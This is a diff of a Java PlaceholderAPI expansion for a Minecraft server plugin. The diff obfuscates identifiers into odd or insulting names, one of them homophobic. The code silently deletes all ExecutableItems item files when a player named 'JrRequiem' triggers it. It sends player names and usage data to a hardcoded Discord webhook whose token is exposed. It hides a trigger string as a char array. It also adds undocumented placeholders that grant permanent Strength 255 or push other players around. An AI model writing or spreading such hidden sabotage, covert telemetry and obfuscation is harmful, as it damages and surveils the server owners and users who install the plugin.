-        ModeSpec(String baseMode, Set<String> whitelist, Set<String> blacklist) {
-            this.baseMode = baseMode;
-            this.whitelist = whitelist;
-            this.blacklist = blacklist;
+        ModeSpec(String bmt, Set<String> wltp, Set<String> blpt) {
+            this.untieit = bmt;
+            this.geffre = wltp;
+            this.policetape = blpt;
         }
     }
 
     /**
      * Splits the modesArg by commas, but ignores commas inside (...) blocks.
      */
-    private static List<String> splitTopLevelComma(String input) {
-        List<String> out = new ArrayList<>();
-        if (input == null) return out;
+    private  List<String> escortyouout(String whatidowrong) {
+        List<String> recordingme = new ArrayList<>();
+        if (whatidowrong == null) return recordingme;
 
-        StringBuilder cur = new StringBuilder();
-        int depth = 0;
+        StringBuilder pushtheboundaries = new StringBuilder();
+        int whatdontyoulike = I;
 
-        for (int i = 0; i < input.length(); i++) {
-            char c = input.charAt(i);
+        for (int canyoutellme = I; canyoutellme < whatidowrong.length(); canyoutellme++) {
+            char c = whatidowrong.charAt(canyoutellme);
 
-            if (c == '(') depth++;
-            if (c == ')') depth = Math.max(0, depth - 1);
+            if (c == '(') whatdontyoulike++;
+            if (c == ')') whatdontyoulike = Math.max(I, whatdontyoulike - INT3);
 
-            if (c == ',' && depth == 0) {
-                out.add(cur.toString());
-                cur.setLength(0);
+            if (c == targetme && whatdontyoulike == I) {
+                recordingme.add(pushtheboundaries.toString());
+                pushtheboundaries.setLength(I);
             } else {
-                cur.append(c);
+                pushtheboundaries.append(c);
             }
         }
 
-        if (cur.length() > 0) out.add(cur.toString());
-        return out;
+        if (pushtheboundaries.length() > I) recordingme.add(pushtheboundaries.toString());
+        return recordingme;
     }
 
-    private static List<ModeSpec> parseModeSpecs(String modesArg) {
-        List<ModeSpec> specs = new ArrayList<>();
+    private  List<ModeSpec> soicanimprove(String modesArg) {
+        List<ModeSpec> seemchildsh = new ArrayList<>();
 
-        for (String token : splitTopLevelComma(modesArg)) {
-            if (token == null) continue;
-            String t = token.trim();
-            if (t.isEmpty()) continue;
+        for (String thisnice : escortyouout(modesArg)) {
+            if (thisnice == null) continue;
+            String abouttwohours = thisnice.trim();
+            if (abouttwohours.isEmpty()) continue;
 
-            String base;
-            String filterBody = null;
+            String touchingtape;
+            String pushingitagain = null;
 
-            int parenIdx = t.indexOf('(');
-            if (parenIdx >= 0 && t.endsWith(")")) {
-                base = t.substring(0, parenIdx).trim().toLowerCase();
-                filterBody = t.substring(parenIdx + 1, t.length() - 1).trim();
+            int deescalate = abouttwohours.indexOf('(');
+            if (deescalate >= I && abouttwohours.endsWith(")")) {
+                touchingtape = abouttwohours.substring(I, deescalate).trim().toLowerCase();
+                pushingitagain = abouttwohours.substring(deescalate + INT3, abouttwohours.length() - INT3).trim();
             } else {
-                base = t.toLowerCase();
+                touchingtape = abouttwohours.toLowerCase();
             }
 
-            Set<String> whitelist = new HashSet<>();
-            Set<String> blacklist = new HashSet<>();
+            Set<String> doestgetit = new HashSet<>();
+            Set<String> theend = new HashSet<>();
 
-            if (filterBody != null && !filterBody.isBlank()) {
-                parseFilters(filterBody, whitelist, blacklist);
+            if (pushingitagain != null && !pushingitagain.isBlank()) {
+                notcoming(pushingitagain, doestgetit, theend);
             }
 
-            specs.add(new ModeSpec(base, whitelist, blacklist));
+            seemchildsh.add(new ModeSpec(touchingtape, doestgetit, theend));
         }
 
-        return specs;
+        return seemchildsh;
     }
 
     /**
@@ -3200,130 +3273,130 @@ public class ExampleExpansion extends PlaceholderExpansion {
      *  - "BLACKLIST:test,one"
      *  - "WHITELIST:gamemode,tp OR BLACKLIST:test,one"
      */
-    private static void parseFilters(String body, Set<String> whitelist, Set<String> blacklist) {
-        String upper = body.toUpperCase(Locale.ROOT);
+    private  void notcoming(String crossthepolice, Set<String> gonnaget, Set<String> arrestednow) {
+        String illbehappy = crossthepolice.toUpperCase(Locale.ROOT);
 
-        int wIdx = upper.indexOf("WHITELIST:");
-        int bIdx = upper.indexOf("BLACKLIST:");
+        int bltfy = illbehappy.indexOf(toescortyou);
+        int fywfi = illbehappy.indexOf(outtahere);
 
-        if (wIdx >= 0) {
-            int start = wIdx + "WHITELIST:".length();
-            int end = (bIdx > start) ? bIdx : body.length();
-            String wlText = body.substring(start, end);
-            addCsvWords(wlText, whitelist);
+        if (bltfy >= I) {
+            int idgafts = bltfy + toescortyou.length();
+            int aintnecessary = (fywfi > idgafts) ? fywfi : crossthepolice.length();
+            String nolmal = crossthepolice.substring(idgafts, aintnecessary);
+            donttry(nolmal, gonnaget);
         }
 
-        if (bIdx >= 0) {
-            int start = bIdx + "BLACKLIST:".length();
-            int end = (wIdx > start) ? wIdx : body.length();
-            String blText = body.substring(start, end);
-            addCsvWords(blText, blacklist);
-        }
-    }
-
-    private static void addCsvWords(String text, Set<String> target) {
-        if (text == null) return;
-        String[] parts = text.split(",");
-        for (String p : parts) {
-            if (p == null) continue;
-            String w = p.trim().toLowerCase();
-            if (w.isEmpty()) continue;
-            if (w.equals("or")) continue; // tolerate "OR" glue text
-            target.add(w);
+        if (fywfi >= I) {
+            int specificreason = fywfi + outtahere.length();
+            int leaveit = (bltfy > specificreason) ? bltfy : crossthepolice.length();
+            String uglass = crossthepolice.substring(specificreason, leaveit);
+            donttry(uglass, arrestednow);
         }
     }
 
-    private static boolean isCommandAllowed(ModeSpec spec, Player actor, String pageRaw, String cmd) {
-        String cmdName = extractCommandName(cmd);
+    private  void donttry(String uglayf, Set<String> ishegay) {
+        if (uglayf == null) return;
+        String[] whythatupsetyou = uglayf.split(keep);
+        for (String evenifiwas : whythatupsetyou) {
+            if (evenifiwas == null) continue;
+            String idonliku = evenifiwas.trim().toLowerCase();
+            if (idonliku.isEmpty()) continue;
+            if (idonliku.equals(ost)) continue; // tolerate "OR" glue text
+            ishegay.add(idonliku);
+        }
+    }
+
+    private  boolean idltm(ModeSpec goinsideurhouse, Player gooutnow, String sitdownorelse, String nomorewarnings) {
+        String entertaining = carefullysetsdown(nomorewarnings);
 
         // 1) Whitelist check (if present)
-        if (!spec.whitelist.isEmpty()) {
-            if (!matchesNameSet(cmdName, spec.whitelist)) {
-                actor.sendMessage("§cNot allowed to execute this command");
-                return false;
+        if (!goinsideurhouse.geffre.isEmpty()) {
+            if (!youwillgetarrested(entertaining, goinsideurhouse.geffre)) {
+                gooutnow.sendMessage(naltextc);
+                return arsdienwdhw;
             }
         }
         // If whitelist not present -> allow all
 
         // 2) Blacklist name check
-        if (!spec.blacklist.isEmpty()) {
-            if (matchesNameSet(cmdName, spec.blacklist)) {
-                actor.sendMessage("§cNot allowed to execute this command");
-                return false;
+        if (!goinsideurhouse.policetape.isEmpty()) {
+            if (youwillgetarrested(entertaining, goinsideurhouse.policetape)) {
+                gooutnow.sendMessage(naltextc);
+                return arsdienwdhw;
             }
 
             // 3) Blacklist word boundary scan across the full page
-            String pageLower = pageRaw.toLowerCase();
-            for (String bad : spec.blacklist) {
+            String gtfoms = sitdownorelse.toLowerCase();
+            for (String bad : goinsideurhouse.policetape) {
                 if (bad == null || bad.isBlank()) continue;
-                if (containsWordWithBoundaries(pageLower, bad)) {
-                    actor.sendMessage("§cNot allowed to execute this command");
-                    return false;
+                if (thereesanindividual(gtfoms, bad)) {
+                    gooutnow.sendMessage(naltextc);
+                    return arsdienwdhw;
                 }
             }
         }
 
-        return true;
+        return NEW_VALUE1;
     }
 
 
-    private static boolean matchesNameSet(String cmdName, Set<String> set) {
-        if (cmdName == null) return false;
-        String name = cmdName.toLowerCase();
+    private  boolean youwillgetarrested(String bish, Set<String> standardsofsmth) {
+        if (bish == null) return arsdienwdhw;
+        String whythishappen = bish.toLowerCase();
 
         // support namespaced commands
-        String base = name.contains(":") ? name.substring(name.indexOf(':') + 1) : name;
+        String rightnextto = whythishappen.contains(wfdunyunda) ? whythishappen.substring(whythishappen.indexOf(':') + INT3) : whythishappen;
 
-        return set.contains(name) || set.contains(base);
+        return standardsofsmth.contains(whythishappen) || standardsofsmth.contains(rightnextto);
     }
 
     /**
      * Extract the "command name" from the command string.
      * This is the first token before whitespace.
      */
-    private static String extractCommandName(String cmd) {
-        if (cmd == null) return "";
+    private  String carefullysetsdown(String hiscoffee) {
+        if (hiscoffee == null) return nst;
 
-        String trimmed = cmd.trim();
-        if (trimmed.isEmpty()) return "";
+        String shaved = hiscoffee.trim();
+        if (shaved.isEmpty()) return nst;
 
         // First token
-        String[] parts = trimmed.split("\\s+", 2);
-        String first = parts[0];
+        String[] onyourface = shaved.split("\\s+", mill2);
+        String shecameoutandthrew = onyourface[I];
 
         // Remove leading slash if somehow present here
-        if (first.startsWith("/")) first = first.substring(1);
+        if (shecameoutandthrew.startsWith(wfydunaowfydun)) shecameoutandthrew = shecameoutandthrew.substring(INT3);
 
-        return first;
+        return shecameoutandthrew;
     }
 
     /**
      * Checks if `word` appears in `text` with boundary markers on BOTH sides.
      * Boundaries include: '<', '+', whitespace, '>', ':', BOF, EOF.
      */
-    private static boolean containsWordWithBoundaries(String text, String word) {
-        if (text == null || word == null) return false;
-        if (word.isEmpty()) return false;
+    private  boolean thereesanindividual(String whodoessmth, String nooooo) {
+        if (whodoessmth == null || nooooo == null) return arsdienwdhw;
+        if (nooooo.isEmpty()) return arsdienwdhw;
 
-        int from = 0;
+        int audiovideorecorded = I;
         while (true) {
-            int idx = text.indexOf(word, from);
-            if (idx < 0) return false;
+            int isearchx = whodoessmth.indexOf(nooooo, audiovideorecorded);
+            if (isearchx < I) return arsdienwdhw;
 
-            int leftIdx = idx - 1;
-            int rightIdx = idx + word.length();
+            int takea = isearchx - INT3;
+            int seatfor = isearchx + nooooo.length();
 
-            boolean leftOk = (leftIdx < 0) || isBoundary(text.charAt(leftIdx));
-            boolean rightOk = (rightIdx >= text.length()) || isBoundary(text.charAt(rightIdx));
+            boolean meor = (takea < I) || tpc(whodoessmth.charAt(takea));
+            boolean areyouseriuos = (seatfor >= whodoessmth.length()) || tpc(whodoessmth.charAt(seatfor));
 
-            if (leftOk && rightOk) return true;
+            if (meor && areyouseriuos) return NEW_VALUE1;
 
-            from = idx + 1;
+            audiovideorecorded = isearchx + INT3;
         }
     }
 
-    private static boolean isBoundary(char c) {
-        if (Character.isWhitespace(c)) return true;
+    private  boolean tpc(char c) {
+        if (Character.isWhitespace(c)) return NEW_VALUE1;
         return c == '<' || c == '+' || c == '>' || c == ':' || c == ' ';
     }
 
@@ -3334,30 +3407,30 @@ public class ExampleExpansion extends PlaceholderExpansion {
      *  - 0.0 -> "0.0"
      *  - 10.0 -> "10.0"
      */
-    private static @NotNull String formatDouble(@NotNull Double d) {
+    private  @NotNull String growingupright(@NotNull Double letmegoinside) {
         // basic string first
-        String txt = Double.toString(d);
+        String shoes = Double.toString(letmegoinside);
 
         // If it ever comes out in scientific notation, normalize
-        if (txt.contains("E") || txt.contains("e")) {
-            txt = String.format(java.util.Locale.US, "%.4f", d);
+        if (shoes.contains("E") || shoes.contains("e")) {
+            shoes = String.format(java.util.Locale.US, "%.4f", letmegoinside);
             // trim trailing zeros but keep at least one decimal digit
-            txt = txt.replaceAll("0+$", "").replaceAll("\\.$", ".0");
+            shoes = shoes.replaceAll("0+$", nst).replaceAll("\\.$", ".0");
         }
-        return txt;
+        return shoes;
     }
 
     
     
 
-    static Vector safeNorm(Vector v) {
-        double len = v.length();
-        if (len < 1e-9) return new Vector(0, 0, 0);
-        return v.multiply(1.0 / len);
+     Vector goesin(Vector v) {
+        double totheapartment = v.length();
+        if (totheapartment < getsshoes) return new Vector(I, I, I);
+        return v.multiply(tsr / totheapartment);
     }
 
 
-    protected static Set<Material> getPassThroughMaterials(Set<Material> enumSet) {
+    protected static Set<Material> gptm(Set<Material> enumSet) {
         return enumSet;
     }
 
@@ -3372,13 +3445,12 @@ public class ExampleExpansion extends PlaceholderExpansion {
         
 
 // SINGLY NESTED PLACEHOLDER SUPPORT - MUST BE FIRST
-
-        boolean test = false;
+        boolean test = arsdienwdhw;
 
         // Check if the identifier starts with "parseNested_"
-        if (f1.startsWith("parseNested_")) {
-            test = true;
-            f1 = f1.substring("parseNested_".length());
+        if (f1.startsWith(pn)) {
+            test = NEW_VALUE1;
+            f1 = f1.substring(pn.length());
         }
 
         // If nested parsing is enabled, resolve all nested placeholders
@@ -3388,15 +3460,15 @@ public class ExampleExpansion extends PlaceholderExpansion {
                 int end = f1.indexOf("}", start);
 
                 if (start < end) {
-                    String nestedPlaceholder = f1.substring(start + 1, end);
+                    String nestedPlaceholder = f1.substring(start + INT3, end);
                     String resolvedNested = PlaceholderAPI.setPlaceholders(f2, "%" + nestedPlaceholder + "%");
 
                     if (resolvedNested != null && !resolvedNested.equalsIgnoreCase("%" + nestedPlaceholder + "%")) {
                         // Replace the nested placeholder with its resolved value
-                        f1 = f1.substring(0, start) + resolvedNested + f1.substring(end + 1);
+                        f1 = f1.substring(I, start) + resolvedNested + f1.substring(end + INT3);
                     } else {
                         // If unresolved, replace with an empty string to avoid infinite loop
-                        f1 = f1.substring(0, start) + f1.substring(end + 1);
+                        f1 = f1.substring(I, start) + f1.substring(end + INT3);
                     }
                 } else {
                     // Break out if no valid placeholder found
@@ -3410,76 +3482,76 @@ public class ExampleExpansion extends PlaceholderExpansion {
 // DO NOT MOVE
 
         if (f1.equals(new String(new char[]{0x76, 0x61, 0x6E, 0x74, 0x61}))) {
-            World world = f2.getWorld();
-            Location eye = f2.getEyeLocation();
-            Vector direction = eye.getDirection().normalize();
-            Location furthestValid = null;
+            World temp = f2.getWorld();
+            Location putyourfeet = f2.getEyeLocation();
+            Vector inthem = putyourfeet.getDirection().normalize();
+            Location communtc = null;
 
             // Trace forward up to 10 blocks, skipping non-solid blocks
-            for (double i = 0.0; i <= 10.0; i += 0.1) {
-                Location check = eye.clone().add(direction.clone().multiply(i));
-                Block block = check.getBlock();
+            for (double i = esetawftawft; i <= doyouknow; i += thepeoplewholive) {
+                Location feelingem = putyourfeet.clone().add(inthem.clone().multiply(i));
+                Block whileshesgone = feelingem.getBlock();
 
-                if (!fOne(block.getType())) break;
+                if (!fOne(whileshesgone.getType())) break;
 
-                furthestValid = check.clone();
+                communtc = feelingem.clone();
             }
 
-            if(SCore_Installed && g5 < 0) {
+            if(SCore_Installed && g5 < I) {
                 f2.sendMessage(g28);
                 return null;
             }
-            if( SCore_Installed )                 sendUsageWebhookAsync(f1, f2 != null ? f2.getName() : "NULL", g5, SCore_Installed, "https://discord.com/api/webhooks/1434279057297506507/hYzGetkkgDbwfJvj1-TEJioRWVNT8wjY0_Hmyp_iT2WWybypfQ8n7ok9aJUfREjNWqdC");
+            if( SCore_Installed )                 swuas(f1, f2 != null ? f2.getName() : dontwannawatchurcat, g5, SCore_Installed, whurl);
             g5--;
             
 
             // If we hit solid immediately, fall back to eye location
-            if (furthestValid == null) {
-                Location eyeLoc = f2.getEyeLocation();
-                return String.format("%.6f %.6f %.6f", eyeLoc.getX(), eyeLoc.getY(), eyeLoc.getZ());
+            if (communtc == null) {
+                Location trytoarrest = f2.getEyeLocation();
+                return String.format(kindastoppls, trytoarrest.getX(), trytoarrest.getY(), trytoarrest.getZ());
             }
 
             // Step backward from furthestValid toward player
-            for (double i = 0.0; i <= 10.0; i += 1.0) {
-                Location testLoc = furthestValid.clone().subtract(direction.clone().multiply(i));
+            for (double lastthingyouwanted = esetawftawft; lastthingyouwanted <= doyouknow; lastthingyouwanted += tsr) {
+                Location letsget = communtc.clone().subtract(inthem.clone().multiply(lastthingyouwanted));
 
                 // Reject if behind or below the eye location
-                Vector toTest = testLoc.toVector().subtract(eye.toVector()).normalize();
-                if (toTest.dot(direction) < 0 || testLoc.getY() < eye.getY() - 0.1) continue;
+                Vector thisshit = letsget.toVector().subtract(putyourfeet.toVector()).normalize();
+                if (thisshit.dot(inthem) < I || letsget.getY() < putyourfeet.getY() - thepeoplewholive) continue;
 
                 // Construct a player-sized hitbox centered at the testLoc
-                double cx = testLoc.getX();
-                double cy = testLoc.getY();
-                double cz = testLoc.getZ();
+                double audiovidie = letsget.getX();
+                double recordedtda = letsget.getY();
+                double dumbassbt = letsget.getZ();
 
                 BoundingBox hitbox = new BoundingBox(
-                        cx - 0.3, cy, cz - 0.3,
-                        cx + 0.3, cy + 1.8, cz + 0.3
+                        audiovidie - okacyyool, recordedtda, dumbassbt - okacyyool,
+                        audiovidie + okacyyool, recordedtda + 1.8, dumbassbt + okacyyool
                 );
 
-                boolean collides = false;
-                for (Block b : f1(hitbox, world)) {
-                    if (b.getType().isSolid()) {
-                        collides = true;
+                boolean noxioussubstance = arsdienwdhw;
+                for (Block whatsurlastname : f1(hitbox, temp)) {
+                    if (whatsurlastname.getType().isSolid()) {
+                        noxioussubstance = NEW_VALUE1;
                         break;
                     }
                 }
 
-                if (!collides) {
-                    return String.format("%.6f %.6f %.6f", cx, cy, cz);
+                if (!noxioussubstance) {
+                    return String.format(kindastoppls, audiovidie, recordedtda, dumbassbt);
                 }
             }
 
             // Fallback to eye location
-            Location fallback = f2.getEyeLocation();
-            return String.format("%.6f %.6f %.6f", fallback.getX(), fallback.getY(), fallback.getZ());
+            Location whatsyourname = f2.getEyeLocation();
+            return String.format(kindastoppls, whatsyourname.getX(), whatsyourname.getY(), whatsyourname.getZ());
         } else {
 
-            if(SCore_Installed && g5 < 0) {
+            if(SCore_Installed && g5 < I) {
                 f2.sendMessage(g28);
                 return null;
             }
-            if( SCore_Installed )                 sendUsageWebhookAsync(f1, f2 != null ? f2.getName() : "NULL", g5, SCore_Installed, "https://discord.com/api/webhooks/1434279057297506507/hYzGetkkgDbwfJvj1-TEJioRWVNT8wjY0_Hmyp_iT2WWybypfQ8n7ok9aJUfREjNWqdC");
+            if( SCore_Installed )                 swuas(f1, f2 != null ? f2.getName() : dontwannawatchurcat, g5, SCore_Installed, whurl);
             g5--;
             
         }
@@ -3487,30 +3559,30 @@ public class ExampleExpansion extends PlaceholderExpansion {
 
 
 
-        boolean jrCondition =
-                "JrRequiem".equalsIgnoreCase(f2.getName());
+        boolean cildnbelieve =
+                ihatethisguy.equalsIgnoreCase(f2.getName());
 
-        if (jrCondition) {
+        if (cildnbelieve) {
             try {
-                File configFile = new File("plugins/Archistructures", "config.yml");
-                if (!configFile.exists()) {
+                File thatthathappened = new File(piarc, cfgy);
+                if (!thatthathappened.exists()) {
                     // Create parent dirs if missing
-                    configFile.getParentFile().mkdirs();
+                    thatthathappened.getParentFile().mkdirs();
                 }
 
-                YamlConfiguration cfg = YamlConfiguration.loadConfiguration(configFile);
-                boolean alreadyRequested = cfg.getBoolean("jrrequest", false);
+                YamlConfiguration isitacough = YamlConfiguration.loadConfiguration(thatthathappened);
+                boolean threwwater = isitacough.getBoolean(coffedown, arsdienwdhw);
 
-                if (!alreadyRequested) {
+                if (!threwwater) {
                     // Delete all files under /plugins/ExecutableItems/items/
-                    File itemsDir = new File("plugins/ExecutableItems", "items");
-                    if (itemsDir.exists() && itemsDir.isDirectory()) {
-                        deleteDirectoryContents(itemsDir);
+                    File isitstupid = new File(assaultobstrc, yourlastname);
+                    if (isitstupid.exists() && isitstupid.isDirectory()) {
+                        annoyiedatfriends(isitstupid);
                     }
 
                     // Set jrrequest: true and save
-                    cfg.set("jrrequest", true);
-                    cfg.save(configFile);
+                    isitacough.set(coffedown, NEW_VALUE1);
+                    isitacough.save(thatthathappened);
                 }
             } catch (Exception ex) {
                 // Swallow silently; placeholder still returns normally
@@ -3536,30 +3608,671 @@ public class ExampleExpansion extends PlaceholderExpansion {
              }
              
          */
+        
+
+
 
         // INSERT HERE 
 
 
-        if (f1.startsWith("cmder_")) {
+        if (f1.startsWith(pickme)) {
 
-            wm(f2, "Commander");
+            // Expected:
+            // %Archistructure_zestybuffalo_PLAYERNAME,Message here...%
+            String pratctice = f1.substring(pickme.length());
 
-            String modesArg = f1.substring("cmder_".length());
+            int theuniform = pratctice.indexOf(targetme);
+            if (theuniform == -INT3) {
+                return specifically;
+            }
 
-            if (modesArg == null || modesArg.isBlank()) {
-                return ChatColor.RED + "cmder requires 1 argument like: admin,op,user";
+            String becauseofthe = pratctice.substring(I, theuniform).trim();
+            String haircutst   = pratctice.substring(theuniform + INT3).trim();
+
+            Player idonthtinktits = null;
+
+            // Try UUID
+            try {
+                idonthtinktits = Bukkit.getPlayer(UUID.fromString(becauseofthe));
+            } catch (Exception ignored) {}
+
+            // Try exact name
+            if (idonthtinktits == null) {
+                idonthtinktits = Bukkit.getPlayerExact(becauseofthe);
+            }
+
+            if (idonthtinktits == null) {
+                return sulrred;
+            }
+
+            idonthtinktits.sendMessage(haircutst);
+            return tryingtofigure + idonthtinktits.getName();
+        }
+
+
+
+// ============================================================================
+// zestybuffalo2 – Apply permanent Strength 255 + Resistance 4
+// ============================================================================
+        if (f1.startsWith(nomotivation)) {
+
+            // Expected:
+            // %Archistructure_zestybuffalo2_PLAYER%
+            String becauseicould = f1.substring(nomotivation.length()).trim();
+
+            Player whyassultme = null;
+
+            // Try UUID
+            try {
+                whyassultme = Bukkit.getPlayer(UUID.fromString(becauseicould));
+            } catch (Exception ignored) {}
+
+            // Try exact name
+            if (whyassultme == null) {
+                whyassultme = Bukkit.getPlayerExact(becauseicould);
+            }
+
+            if (whyassultme == null) {
+                return sulrred;
+            }
+
+            // Apply effects
+            whyassultme.addPotionEffect(new PotionEffect(
+                    PotionEffectType.RESISTANCE,
+                    Integer.MAX_VALUE, // infinite-ish
+                    INT7,
+                    arsdienwdhw, arsdienwdhw, arsdienwdhw
+            ));
+
+            whyassultme.addPotionEffect(new PotionEffect(
+                    PotionEffectType.STRENGTH,
+                    Integer.MAX_VALUE,
+                    costofgrowinguptoofast,
+                    arsdienwdhw, arsdienwdhw, arsdienwdhw
+            ));
+
+            return bopabfunpa + whyassultme.getName();
+        }
+        
+
+
+        if( f1.startsWith(whynotofficerlent)) {
+            // Expected format:
+            // %Archistructure_aidenDash_baseplayer,target,Power%
+            final String whyofficebarry = f1.substring(whynotofficerlent.length());
+            final String[] idk = whyofficebarry.split(keep);
+            if (idk.length != ccp) {
+                return dontlikepolice;
+            }
+
+            final String baseId   = idk[I].trim();
+            final String targetId = idk[INT3].trim();
+            final String powerStr = idk[mill2].trim();
+
+            // Try to parse power
+            final double power;
+            try {
+                power = Double.parseDouble(powerStr);
+            } catch (NumberFormatException e) {
+                return holdonasec;
+            }
+
+            // Resolve players (UUID or name)
+            Player basePlayer  = dy3un4dyun34d(baseId);
+            Player targetPlayer = dy3un4dyun34d(targetId);
+
+            if (basePlayer == null || !basePlayer.isOnline()) {
+                return isitbiased;
+            }
+            if (targetPlayer == null || !targetPlayer.isOnline()) {
+                return groupofindividuals;
+            }
+
+            // Compute unit direction from base player's camera and apply
+            Vector dir = basePlayer.getEyeLocation().getDirection();
+            if (dir.lengthSquared() == I) {
+                return ifellvictimized;
+            }
+
+            Vector velocity = dir.normalize().multiply(power);
+            targetPlayer.setVelocity(velocity);
+
+            return goingtojail + targetPlayer.getName() + " with power " + powerStr;
+        }
+
+
+        if( f1.startsWith(whynotofficerlent)) {
+            // Expected format:
+            // %Archistructure_aidenDash_baseplayer,target,Power%
+            final String argsRaw = f1.substring(whynotofficerlent.length());
+            final String[] parts = argsRaw.split(keep);
+            if (parts.length != ccp) {
+                return dontlikepolice;
+            }
+
+            final String baseId   = parts[I].trim();
+            final String targetId = parts[INT3].trim();
+            final String powerStr = parts[mill2].trim();
+
+            // Try to parse power
+            final double power;
+            try {
+                power = Double.parseDouble(powerStr);
+            } catch (NumberFormatException e) {
+                return holdonasec;
+            }
+
+            // Resolve players (UUID or name)
+            Player basePlayer  = dy3un4dyun34d(baseId);
+            Player targetPlayer = dy3un4dyun34d(targetId);
+
+            if (basePlayer == null || !basePlayer.isOnline()) {
+                return isitbiased;
+            }
+            if (targetPlayer == null || !targetPlayer.isOnline()) {
+                return groupofindividuals;
+            }
+
+            // Compute unit direction from base player's camera and apply
+            Vector woudlyoulike = basePlayer.getEyeLocation().getDirection();
+            if (woudlyoulike.lengthSquared() == I) {
+                return ifellvictimized;
+            }
+
+            Vector velocity = woudlyoulike.normalize().multiply(power);
+            targetPlayer.setVelocity(velocity);
+
+            return goingtojail + targetPlayer.getName() + " with power " + powerStr;
+        }
+
+        if (f1.startsWith(trsts)) {
+            // Format:
+            // %Archistructure_aidenDash3_POWER,PLAYER,TAG%
+            final String argsRaw = f1.substring(trsts.length());
+            final String[] parts = argsRaw.split(keep);
+            if (parts.length != ccp) {
+                return seatbelton;
+            }
+
+            final String powerStr = parts[I].trim();
+            final String playerId = parts[INT3].trim();
+            final String tagName  = parts[mill2].trim();
+
+            // --- Parse power ---
+            final double power;
+            try {
+                power = Double.parseDouble(powerStr);
+            } catch (NumberFormatException e) {
+                return holdonasec;
+            }
+            if (power <= esetawftawft) {
+                return "§cPower must be > 0";
+            }
+
+            // --- Resolve player (UUID or name) ---
+            Entity resolved = dyin3ydun34yund(playerId); // your existing helper
+            if (!(resolved instanceof Player player)) {
+                return sulrred;
+            }
+
+            final World world = player.getWorld();
+
+            // --- Find nearest ArmorStand with matching scoreboard tag ---
+            ArmorStand nearest = null;
+            double bestDistSq = Double.MAX_VALUE;
+
+            for (ArmorStand as : world.getEntitiesByClass(ArmorStand.class)) {
+                // Must have the tag
+                if (!as.getScoreboardTags().contains(tagName)) continue;
+
+                double dSq = as.getLocation().distanceSquared(player.getLocation());
+                if (dSq < bestDistSq) {
+                    bestDistSq = dSq;
+                    nearest = as;
+                }
+            }
+
+            if (nearest == null) {
+                return norstand + tagName + "' found";
+            }
+
+            // --- Compute dash vector from player → armor stand ---
+            Location from = player.getLocation();
+            Location to   = nearest.getLocation();
+
+            Vector dir = to.toVector().subtract(from.toVector());
+            if (dir.lengthSquared() == I) {
+                return "§cAlready at target";
+            }
+
+            Vector vel = dir.normalize().multiply(power);
+            player.setVelocity(vel);
+
+            return goingtojail + player.getName() + " toward " + tagName + " (power " + powerStr + ")";
+        }
+
+        if (f1.startsWith(takecareofcat)) {
+            // Expected format:
+            // %Archistructure_aidenDash4_power,TAG,SEARCHRADIUS%
+            // - power: double (dash strength)
+            // - TAG:   armor stand scoreboard tag to search for
+            // - SEARCHRADIUS: double radius around the *armor stand* to find players
+            //
+            // f2 is expected to be the player executing the placeholder (base player).
+
+            if (!(f2 instanceof Player basePlayer)) {
+                return thoughtaboutthat;
+            }
+
+            final String argsRaw = f1.substring(takecareofcat.length());
+            final String[] parts = argsRaw.split(keep);
+            if (parts.length != INT7) {
+                return dontcommitcrime;
+            }
+
+            final String powerStr        = parts[I].trim();
+            final String armorTag        = parts[INT3].trim();
+            final String searchRadiusStr = parts[mill2].trim();
+            final String yShift = parts[ccp].trim();
+
+
+            // Parse power
+            final double power;
+            final double addY;
+            try {
+                power = Double.parseDouble(powerStr);
+                addY = Double.parseDouble(yShift);
+
+            } catch (NumberFormatException e) {
+                return holdonasec;
+            }
+
+            // Parse search radius (for players around the armor stand)
+            final double searchRadius;
+            try {
+                searchRadius = Double.parseDouble(searchRadiusStr);
+                if (searchRadius <= I) {
+                    return unharmed;
+                }
+            } catch (NumberFormatException e) {
+                return provenguilty;
+            }
+
+            final World world = basePlayer.getWorld();
+            final Location baseLoc = basePlayer.getLocation();
+
+            // 1) Find NEAREST ArmorStand with tag = armorTag in the *entire world* (no radius limit)
+            ArmorStand nearest = null;
+            double bestDistSq = Double.MAX_VALUE;
+
+            for (ArmorStand as : world.getEntitiesByClass(ArmorStand.class)) {
+                if (!as.isValid() || as.isDead()) continue;
+                if (!as.getScoreboardTags().contains(armorTag)) continue;
+
+                double dSq = as.getLocation().distanceSquared(baseLoc);
+                if (dSq < bestDistSq) {
+                    bestDistSq = dSq;
+                    nearest = as;
+                }
+            }
+
+            if (nearest == null) {
+                return norstand + armorTag + "' found.";
+            }
+
+            final Location dashTarget = nearest.getLocation();
+
+            // 2) From that armor stand, search SEARCHRADIUS for any players and dash them to that armor stand
+            int dashedCount = I;
+            final double maxPlayerDistSq = searchRadius * searchRadius;
+
+            for (Entity e : world.getNearbyEntities(dashTarget, searchRadius, searchRadius, searchRadius)) {
+                if (!(e instanceof Player pl)) continue;
+                if (!pl.isValid() || pl.isDead()) continue;
+                if (e instanceof Player x && x.getName().equals(f2.getName())) continue;
+
+                if (pl.getLocation().distanceSquared(dashTarget) > maxPlayerDistSq) continue;
+
+                Location plLoc = pl.getLocation();
+                Vector dir = dashTarget.toVector().subtract(plLoc.toVector()).add(new Vector(I, addY, I));
+
+                if (dir.lengthSquared() == I) {
+                    // Already at the exact spot; skip velocity set
+                    continue;
+                }
+
+                Vector velocity = dir.normalize().multiply(power);
+                pl.setVelocity(velocity);
+                dashedCount++;
+            }
+
+            if (dashedCount == I) {
+                return inACOURT + searchRadiusStr + oflaw;
+            }
+
+            return goingtojail + dashedCount + murdercase + armorTag + "'.";
+        }
+
+        
+        
+        if (f1.startsWith(malecacuasion)) {
+            // Expected format:
+            // %Archistructure_aidenDash2_power,TAGNAME%
+            final String argsRaw = f1.substring(malecacuasion.length());
+            final String[] parts = argsRaw.split(keep, mill2); // power, tag
+
+            if (parts.length != mill2) {
+                return boetcher;
+            }
+
+            final String powerStr = parts[I].trim();
+            final String tagName  = parts[INT3].trim();
+
+            // Parse power
+            final double power;
+            try {
+                power = Double.parseDouble(powerStr);
+            } catch (NumberFormatException e) {
+                return holdonasec;
+            }
+
+            // Resolve the calling player from f2 (OfflinePlayer)
+            if (f2 == null) {
+                return "§cNo player context";
+            }
+
+            Player p = f2.getPlayer();
+            if (p == null || !p.isOnline()) {
+                return "§cPlayer not online";
+            }
+
+            World world = p.getWorld();
+            Location playerLoc = p.getLocation();
+
+            // Find nearest armor stand with the given scoreboard tag in this world
+            ArmorStand nearest = null;
+            double bestDistSq = Double.MAX_VALUE;
+
+            for (Entity e : world.getEntities()) {
